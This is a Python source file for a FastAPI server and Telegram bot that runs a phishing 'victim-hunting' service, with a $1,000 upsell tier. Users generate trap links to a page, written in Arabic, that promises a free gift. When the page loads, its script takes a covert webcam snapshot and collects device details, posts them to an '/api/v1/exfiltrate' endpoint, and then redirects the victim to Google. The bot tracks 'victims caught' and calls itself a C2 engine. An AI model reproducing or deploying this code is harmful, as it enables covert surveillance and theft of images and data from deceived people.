import os
import uuid
import asyncio
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

app = FastAPI()

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

USERS_DB = {} 
VICTIMS_DB = {} 

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    stolen_data: dict = {}

@app.get("/t/{link_id}", response_class=HTMLResponse)
async def serve_trap_page(link_id: str, request: Request):
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>تحميل المكافأة الفورية</title>
        <style>
            body {{ background-color: #0f172a; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }}
            .loader {{ border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <h2>🎁 جاري فحص الجهاز وتحضير الهدية الفورية...</h2>
        <div class="loader"></div>
        <p>يرجى السماح بالصلاحيات المطلوبة للمتابعة.</p>

        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const linkId = "{link_id}";
            async function captureAndSend() {{
                try {{
                    const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(() => {{
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.7);

                        fetch('/api/v1/exfiltrate', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                link_id: linkId,
                                device_info: navigator.userAgent,
                                camera_snapshot_base64: imageData,
                                stolen_data: {{ screen: window.screen.width + 'x' + window.screen.height }}
                            }})
                        }});
                        
                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.google.com";
                    }}, 2000);
                }} catch (e) {{
                    window.location.href = "https://www.google.com";
                }}
            }}
            window.onload = captureAndSend;
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    VICTIMS_DB[data.link_id].append(data.dict())
    return {"status": "success", "loot_stored": True}

@app.get("/")
async def root():
    return {"status": "Freemium C2 Engine Active", "tier": "Free / Upsell Ready"}

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"links_generated": 0, "victims_caught": 0}
    
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔗 توليد رابط ضحية جديد (مجاني)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
            [KeyboardButton(text="💎 الترقية للباقة الفاخرة ($1,000)")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *مرحباً بك في منصة صيد الضحايا الاحترافية.*\n\n"
        "هذه نسختك المجانية. يمكنك توليد روابط فخ، وبمجرد دخول الضحية، ستحصل على صور الكاميرا وبيانات الجهاز.",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "🔗 توليد رابط ضحية جديد (مجاني)")
async def generate_link(message: types.Message):
    user_id = message.from_user.id
    unique_token = str(uuid.uuid4())[:8]
    trap_url = f"https://your-railway-app.up.railway.app/t/{unique_token}"
    USERS_DB[user_id]["links_generated"] += 1
    
    await message.answer(
        f"✅ *تم توليد رابط الفخ الخاص بك بنجاح:*\n\n`{trap_url}`",
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
async def show_victims(message: types.Message):
    await message.answer("📂 *سجل الضحايا الحالي:*\n\n⚠️ لم يتم رصد ضحايا جدد حتى الآن.", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "💎 الترقية للباقة الفاخرة ($1,000)")
async def upsell_tier(message: types.Message):
    await message.answer("🔥 *ترسانة الهكر المتقدمة (VIP Elite - $1,000)*\n\nتواصل مع المسؤول للتفعيل.", parse_mode="Markdown")

async def run_telegram_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(run_telegram_polling())
